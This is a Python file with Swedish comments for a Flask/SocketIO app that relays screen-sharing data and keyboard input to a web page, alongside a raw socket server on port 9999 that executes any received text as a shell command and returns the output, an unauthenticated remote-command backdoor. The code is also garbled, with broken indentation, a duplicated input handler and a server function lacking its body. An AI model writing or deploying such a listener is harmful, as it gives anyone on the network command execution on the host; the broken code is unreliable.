import socket
import subprocess
from flask import Flask, render_template
from flask_socketio import SocketIO, emit

# Flask och SocketIO
app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app)

# Serverkonfiguration
HOST = ''  # Lyssna på alla nätverksgränssnitt
PORT = 9999  # Port för din befintliga kommunikation

# Flask-rutter
@app.route('/')
def index():
    return render_template('index.html')

@socketio.on('input')
def handle_input(data):
    emit('input', data, broadcast=True)  # Vidarebefordra input till klienten

@socketio.on('screen')
def handle_screen(data):
    emit('stream', data, broadcast=True)  # Sänd skärmdelningen till webbsidan

# Din befintliga serverlogik
def start_socket_server():

   def handle_screen(data):
    emit('stream', data, broadcast=True, namespace='/my_namespace')



    emit('stream', data, broadcast=True, namespace='/')

@socketio.on('input', namespace='/')
def handle_input(data):
    emit('input', data, broadcast=True, namespace='/')
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(1)
        print(f"Lyssnar på port {PORT}...")
        conn, addr = s.accept()
        with conn:
            print(f"Ansluten från {addr}")
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                cmd = data.decode('utf-8').strip()
                if cmd.lower() == 'exit':
                    print("Avslutar anslutning...")
                    break
                try:
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                except subprocess.CalledProcessError as e:
                    output = e.output
                conn.sendall(output)

# Starta Flask och SocketIO
if __name__ == '__main__':
    socketio.start_background_task(target=start_socket_server)  # Kör din server i bakgrunden
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
